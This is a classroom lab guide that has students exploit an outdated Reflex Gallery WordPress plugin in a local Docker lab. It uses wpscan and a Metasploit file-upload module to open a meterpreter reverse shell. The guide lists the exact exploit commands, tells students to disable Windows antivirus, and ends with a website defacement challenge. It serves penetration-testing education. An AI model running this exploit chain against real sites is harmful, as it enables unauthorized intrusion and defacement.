# WordPress vs. Kali

Now that we have our locally hosted Docker containers up and running, we will begin to explore different ways in which we can experiment with our at-home pentesting lab.
> Note: Do not try any of this on real applications or WordPress sites. We purposely have the containers configured with outdated versions and plugins simply to demonstrate applications of Kali linux on a web application that we solely host and own. If you do try it in the real world, you are likely picking a fight that you will lose. The right way to go about finding real-world vulnerabilities is to jump on bug bounty programs or work as a penetration tester in an official, protected capacity.

## Milestone 1: Exploitable Plug-in

We are going to purposely open an attack surface by installing an out-dated plugin, which is very common in larger websites or apps that require a lot of upkeep. For our lab, we will be installing an older version of a plugin called `Reflex Gallery`.

1. In the WP admin console, go to `Plugins` -> `Add New`
2. Search for `reflex gallery` and you should see `ReFlex Gallery » WordPress Photo Gallery`
3. Click on the result but don't install the plugin yet. Look at the Changelog tab for any critical security issues that were 
4. patched and install the version just before it was patched.
5. On the right side of the dialog, where it lists the compatibility and installs data, click the `WordPress.org Plugin Page » link`
6. You'll be taken to the official WP plugin page. Click on the `Development` tab
7. Click `Advanced View`
8. Under Previous Versions, download the **3.1.3 zip file**
9. In the WordPress admin console, go to `Plugins -> Add New -> Upload Plugin`, specify the zip file you downloaded, then click `Install Now`
10. Go to admin console plugins page, find the plugin, and click `Activate`

From here, we will require you to actually create a gallery using the plugin and use it on a page. I recommend to create a new page for this and insert your gallery there.

## Milestone 2: Reconaissance

Developed by Lockheed Martin, a defense contractor, we will be entering the first step in the [Cyber Kill Chain], recon. Essentially, we are going to try to get our first glimpse into some things that we can exploit. In this case, our outdated Reflex Gallery plugin will be that thing; however, in a real environment, we would not explicitly know this beforehand. 

This is where our Kali container will come into play, and our familiar friend, `wpscan`. There are a multitude of scanning tools that scan for different things, but `wpscan` is explicitly for WordPress and is why we have chosen this tool in particular. 

Since from last week, we know that `wpscan` is properly configured and working, we will conduct another scan after having our vulnerable plugin running on the WP container.

```bash
wpscan --url http://localhost:8080/ --random-user-agent --api-token <your api token>
```

If everything is running correctly, and you have the plugin properly configured on your WP container, the output should show that your scan has picked up on the Reflex Gallery vulnerability.

```
[i] Plugin(s) Identified:

[+] reflex-gallery
 | Location: http://localhost:8080/wp-content/plugins/reflex-gallery/
 | Last Updated: 2021-03-10T02:38:00.000Z
 | [!] The version is out of date, the latest version is 3.1.7
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Reflex Gallery <= 3.1.3 - Arbitrary File Upload
 |     Fixed in: 3.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/c2496b8b-72e4-4e63-9d78-33ada3f1c674
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4133
 |      - https://www.exploit-db.com/exploits/36374/
 |      - https://packetstormsecurity.com/files/130845/
 |      - https://packetstormsecurity.com/files/131515/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload/
```

With this information, we can now step into the next stages of the Cyber Kill Chain. Luckily, this is an introduction to pentesting. So, the next stages are actually automated for us via another handy tool, `Metasploit`. `Metasploit` is commonly used by whitehat penetration testers who have get-out-of-jail free cards. It is a framework that allows for the use of [CVE's], and other handy known exploits, allowing us to tap into literal databases full of them. 

One major disadvantage for a blackhat to use `Metasploit` is that it calls upon already known exploits, which in turn, means that security professionals or services are much more likely to pick up on it. 

## Milestone 3: Metasploit

If you look closely at the `wpscan` output, we can see that Reflex Gallery is vulnerable to `Arbitrary File Upload`, meaning we are going to take a look at what's called a **payload**. 

The term "payload" can be used to refer many different things such as malware, scripts, malicious input, etc. It is what composes step 2 in the Cyber Kill Chain, weaponization, with our payload being the weapon. 

Now the way that `Metasploit` works is it calls upon a database that contains these exploits and payloads, so we will need to spin it up and confirm that our `Metasploit` console has access to it.

To start the db, run:
```bash
service postgresql start
msfdb init
```
The expected output should be:

![image](https://user-images.githubusercontent.com/66766340/162883780-2467f3b1-4ce3-4a8e-8409-d4dab89d1013.png)

Now that we have our exploit database up and running, we need to now start up the `Metasploit` console with:

```bash
msfconsole
```

Then move on to sanity check that our console has access to the db with:

```bash
msf6 > db_status
```
![image](https://user-images.githubusercontent.com/66766340/162884299-08034a7e-188d-4e68-a021-6822f4675532.png)

With this, `Metasploit` should be properly configured and ready to go; however, before we begin our exploit, we need to take care of a few things in our pentesting environment. So exit the console by running `exit`. 

---

On your host machine, especially if it is Windows, there will typically be some sort of antivirus running. We will actually need to disable it in order to run our exploit without it getting in the way.
> This is actually a good thing to know that out-of-the-box AV can pick up on Metasploit exploits!

For Windows users, we will need to open up `Windows Security`. Under `Virus & threat protection`, we need to disable `Real-time protection` for the duration of the lab.

![image](https://user-images.githubusercontent.com/66766340/162884714-46f108be-a121-476c-94e3-2eb7cc411b76.png)

With our AV out of the way to prevent the interception of our payload, we will also need to figure out the IP address of our Kali container.
> The need for this will be explained in-depth later in the manual

To do so, run `ifconfig` in your Kali container and take note of the IP address under the `eth0` section. 

![image](https://user-images.githubusercontent.com/66766340/162885193-438413b3-7ca1-44d1-91b2-1a9ede48d40c.png)

---

## Milestone 4: Pwnage

Now that we have our AV out of the way, and we know our Kali container's IP address, we can restart our console with `msfconsole` and get to the fun part.

Within the console, we now need to `search` the database for a Reflex exploit. This is as simple as running:

```bash
msf6 > search Reflex
```
and it will return the result with the exploit that has been crafted specially for our Reflex Gallery vulnerability.

```bash
msf6 > search Reflex

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability
```
Now we need to instruct the console to `use` this exploit by running:

```bash
msf6 > use 0
```
> We can also do `use exploit/unix/webapp/wp_reflexgallery_file_upload`

With msfconsole now "using" this exploit, we need to configure it so that it runs properly within our environment. We can do so by running:

```bash
msf6 exploit(exploit/unix/webapp/wp_reflexgallery_file_upload) > info
```

and it will present us with the `Basic options:` section. Here is where we will need to make some changes. This requires a bit of networking knowledge, and is why we took note of our kali container's IP address. The variable `RHOST` will be our target, and there is another one called `LHOST`, or "listening host".

A listening post, LP, is what will allow us to open up a reverse shell on the container that is hosting our WordPress site. If you've paid close attention to more information gathered from the `wpscan`, it is getting hosted by an apache server, which is linux. This reverse shell, essentially grants us access to this linux server and all of the information on it i.e. we will have our chance to pwn this box.

For now, let's configure the exploit by setting the `RHOST` variable to our website via:

```bash
msf6 exploit(exploit/unix/webapp/wp_reflexgallery_file_upload) > set RHOST 127.0.0.1
```
and we will also need to ensure that it is sent through the right port with:
```bash
msf6 exploit(exploit/unix/webapp/wp_reflexgallery_file_upload) > set RPORT 8080
```

And now to set the LP to our kali container, we need to similarly set the `LHOST` variable via:

```bash
msf6 exploit(exploit/unix/webapp/wp_reflexgallery_file_upload) > set LHOST <your Kali IP>
```
> The LPORT will be automatically set and opened for you by the exploit

![image](https://user-images.githubusercontent.com/66766340/162887290-28fb29f4-677c-429f-bf2c-dfb1ceea1c2f.png)

Now, we are ready to cruise through to the next steps of the Cyber Kill Chain: Delivery, Exploitation, Installation, and Command and Control. Essentially, we have performed Recon ourselves with `wpscan`, but `Metasploit` has handled every other step from Weaponization all the way to Command and Control for us!

To run the exploit, it is one simple command:

```bash
msf6 exploit(exploit/unix/webapp/wp_reflexgallery_file_upload) > exploit
```

After letting our payload run it's magic, we are greeted with the trusty `meterpreter` reverse shell. This is the moment where we stop mashing our keyboards and mutter *"I'm in"*. 

![image](https://user-images.githubusercontent.com/66766340/162887400-88a59fa2-1049-41c8-86e3-31e244c456da.png)
> Reverse shells in particular are notorious for being unstable and hard to create from scratch with our payloads. Meterpreter is a solution to that problem, offering a stable, very basic shell on the server we have exploited.

In reference to the Cyber Kill Chain, we have breezed all the way to the Command and Control stage, now having access to our WordPress site's server. Now, one thing to note is that this shell is not as beefy and well developed as the ones we are used to when using linux. So you will have to know your way around a terminal a bit to navigate the directory system.

Commands such as `pwd`, and `ls` are your best friends. At this point, you now need to manually complete the last part of the Cyber Kill Chain, Actions on Objective. I'll also give you a [meterpreter cheatsheet] for additional commands to use with this reverse shell in particular!

![image](https://user-images.githubusercontent.com/66766340/162889751-4378f9a3-51d3-4a5d-98e5-97130c311975.png)

---

## Challenge: 
Traverse your website's file system using linux commands and deface some of the text on your homepage. Then, observe your changes on the website by visiting it.

---

## Closing Remarks: Script Kiddie Badge

Essentially, I wanted to introduce you to the basic process of how to conduct a proper penetration test. However, there is much, much more to what we did. A huge amount of the actual Cyber Kill Chain process was covered for us by `Metasploit`, but this is why it is a useful tool in a red team arsenal, as it dramatically speeds up the process, allowing us to produce actual results in a timely fashion. 

At this point in the course, you have become an honorary **Script Kiddie**, which is often a derogatory term in security for "someone who doesn't know what they're doing". However, I'd like you to take that as a challenge to warm up to the depths of the field and acknowledge just how much time and effort is required to excel. 

In the Weaponization stage, we would actually have to write the php script that serves as our payload. This would require knowledge in exploit development, researching Reflex Gallery and basically breaking its code, and knowing how to craft a reverse shell for the server.

In the Delivery stage, we would need to know the network protocols to use, how to modify our payload to have it send the shell back, and manually open up our listening port. And for black hats, they would need to know how to evade Intrusion Detection/ Prevention Systems and how to remain anonymous during the process. 

The Exploitation stage often relies a ton on luck when using custom payloads and this is probably the climax of all of the work at this point in the kill chain. It's the moment of truth to see if all of your research and educated guesses actually pay off and work. 

After exploitation comes Installation, which involves setting up some form of persistance such as malware that serves as a backdoor for the attacker or penetration tester to access the server later on. This would require further development of yet another payload, taking into consideration what antivirus the target may be using, what kinds of security controls they have set up, and how to embed yourself undetected on their system. 

With Command and Control, one would need deep knowledge of the system they have entered. You'd have to know your way around its controls in order to gain Privilege Escalation, allowing you to access more than what a normal user would be able to. This may require an attacker to have to move laterally throughout the network and find even more vulnerabilities that will eventually grant them full administator access.

Then finally, with Actions on Objective, if an attacker were to steal data, they'd need to figure out how to do it without getting caught. Some of the most prominent hacks involve terabytes of data being stolen, and that would be hard to miss if the system had any type of network monitoring. 

Good luck on the rest of the labs, and I hope this encourages you to dive deeper into security and explore your interests outside of what is being taught by this course!

Head on over to the course portal and continue: https://courses.codepath.org/courses/cybersecurity_university/unit/8#!exercises

> I created this guide as an impromptu update to the old one as we switched our environment from virtualization to containerization, which required some finnicky networking stuff! However, the steps moving forward in the official manual can be done with no issues from here. 

[Cyber Kill Chain]: https://www.crowdstrike.com/cybersecurity-101/cyber-kill-chain/
[CVE's]: https://www.redhat.com/en/topics/security/what-is-cve
[meterpreter cheatsheet]: https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/
